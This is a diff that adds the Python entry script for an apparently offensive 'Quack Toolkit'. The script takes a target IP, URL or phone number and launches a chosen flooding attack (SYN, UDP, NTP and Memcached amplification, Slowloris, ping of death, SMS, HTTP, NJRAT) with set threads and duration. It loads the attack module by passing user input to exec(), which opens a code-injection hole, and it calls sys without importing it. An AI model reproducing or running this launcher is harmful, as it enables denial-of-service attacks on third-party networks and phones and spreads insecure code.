@@ -1,0 +1,41 @@
+#!/usr/bin/env python3
+
+import argparse
+try:
+	import tools.addons.update
+	import tools.addons.clean
+	import tools.addons.winpcap
+	import tools.addons.logo
+except ImportError:
+	print("Failed import some modules!")
+
+def main():
+
+	# Parse args
+	parser = argparse.ArgumentParser()
+	parser.add_argument("--target", type = str, metavar = "<IP:PORT, URL, PHONE>",
+					help = "Target IP:port, URL or phone.")
+	parser.add_argument("--method", type = str, metavar = "[SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]",
+					help = "Attack method.")
+	parser.add_argument("--time", type = int, default = 10, metavar = "<time>",
+					help = 'Time in secounds.')
+	parser.add_argument("--threads", type = int, default = 3, metavar = "<threads>",
+					help = "Threads count.")
+	parser.add_argument("-u", "--update", action='store_true', help = "Update Quack Toolkit")
+	
+	# Get args
+	args = parser.parse_args()
+	threads = args.threads
+	time = args.time
+	method = str(args.method).upper()
+	target = args.target
+	if args.update:
+		import os
+		os.system("chmod +x bin/quack && bin/quack -u")
+		sys.exit()
+	else:
+		parser.print_help()
+	exec("from tools.L4."+ method.lower() + " import "+method+"_ATTACK")
+	exec(method+"_ATTACK(threads, time, target)")
+if __name__ == '__main__':
+	main()
